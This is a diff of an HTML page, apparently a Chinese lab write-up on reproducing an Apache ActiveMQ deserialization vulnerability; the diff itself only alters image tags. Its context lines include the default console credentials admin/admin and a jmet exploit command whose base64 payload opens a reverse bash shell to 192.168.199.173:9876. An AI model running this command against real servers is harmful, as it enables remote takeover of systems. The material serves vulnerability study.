@@ -373,7 +373,7 @@
 <p>环境运行后，将监听61616和8161两个端口其中61616是工作端口，消息在这个端口进行传递; 8161是网络管理页面端口访问<a href="http://your-ip:8161即可看到网络管理页面，不过这个漏洞理论上是不需要网络的。" target="_blank" rel="noopener">http://your-ip:8161即可看到网络管理页面，不过这个漏洞理论上是不需要网络的。</a></p>
 <p>使用浏览器直接访问activemq，查看是否部署完毕</p>
 <p><a href="http://192.168.199.173:8161/admin/（默认用户名/密码：admin/admin）" target="_blank" rel="noopener">http://192.168.199.173:8161/admin/（默认用户名/密码：admin/admin）</a></p>
-<p><img src="C:/Users/Benjamin/AppData/Local/YNote/data/benjamin_engel@163.com/d0fd58a8f2b84d058d0cb6bc5acf55e6/clipboard.png" alt></p>
+<p>![(C:/Users/Benjamin/AppData/Local/YNote/data/benjamin_engel@163.com/d0fd58a8f2b84d058d0cb6bc5acf55e6/clipboard.png)]</p>
 <p><img src="C:/Users/Benjamin/AppData/Local/YNote/data/benjamin_engel@163.com/272dd667c93b4f8aabcaf15e45d41d9a/clipboard.png" alt></p>
 <p>0x02 漏洞复现</p>
 <p>1.漏洞利用过程如下：</p>
@@ -405,7 +405,7 @@
 <p><img src="C:/Users/Benjamin/AppData/Local/YNote/data/benjamin_engel@163.com/7022d6265f4947379c38afd746601107/clipboard.png" alt></p>
 <p>所以，反弹shell的命令应是：</p>
 <p>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4xNzMvOTg3NiAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.199.173 61616</p>
-<p><img src="C:/Users/Benjamin/AppData/Local/YNote/data/benjamin_engel@163.com/48da95910b254f95b91ae57ce95e9742/clipboard.png" alt></p>
+<p>![(C:/Users/Benjamin/AppData/Local/YNote/data/benjamin_engel@163.com/48da95910b254f95b91ae57ce95e9742/clipboard.png)]</p>
 <p>端口监听：</p>
 <p><img src="C:/Users/Benjamin/AppData/Local/YNote/data/benjamin_engel@163.com/db9326c30d6c4ed19708a371c855765b/clipboard.png" alt></p>
 <p>通过点击相应的事件触发漏洞：</p>
